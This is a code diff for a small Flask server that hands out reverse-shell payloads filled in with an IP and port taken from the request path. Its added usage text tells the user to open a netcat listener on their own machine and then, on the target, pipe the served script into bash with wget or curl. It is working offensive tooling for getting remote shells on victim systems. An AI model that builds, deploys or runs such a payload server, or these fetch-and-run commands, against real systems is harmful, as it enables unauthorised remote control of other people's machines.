@@ -1,24 +1,41 @@
 from flask import Flask, make_response, Response
 from string import Template
 from pathlib import Path
+import os
 
 app = Flask(__name__)
 
-def shells(ip:str, port:str) -> str:
+usage = """# 1. On your machine:
+#
+#	rlwrap nc -l 1337
+#
+# 2. On the target machine:
+#
+#	wget -qO- http://mi-ip-host:port/127.0.0.1:1337 | bash
+# 
+#	curl http://mi-ip-host:port/127.0.0.1:1337 | bash
+#
+"""
 
-    template = Template(Path('shells.template').read_text())
+def shells(ip:str, port:str) -> str:
+    file = Path( os.path.dirname(os.path.realpath(__file__)) + '/shells.template' ).read_text()
+    template = Template(file)
     template = template.safe_substitute(host=ip, port=port)
 
     return template
 
-
-@app.route("/<ip>:<port>", methods = ['GET']) # type -> ignore
+@app.route('/', defaults={'ip': '','port':''})
+@app.route("/<ip>:<port>", methods = ['GET'])
 def main(ip:str, port:str) -> Response:
+
+    if not ip or not port:
+        response = make_response(usage)
+        response.content_type = "text/plain"
+
+        return response        
 
     response = make_response(shells(ip, port))
     response.content_type = "text/plain"
-    response.headers['server'] = "shells"
-
     print(f'Shell for: {ip}:{port}')
 
     return response
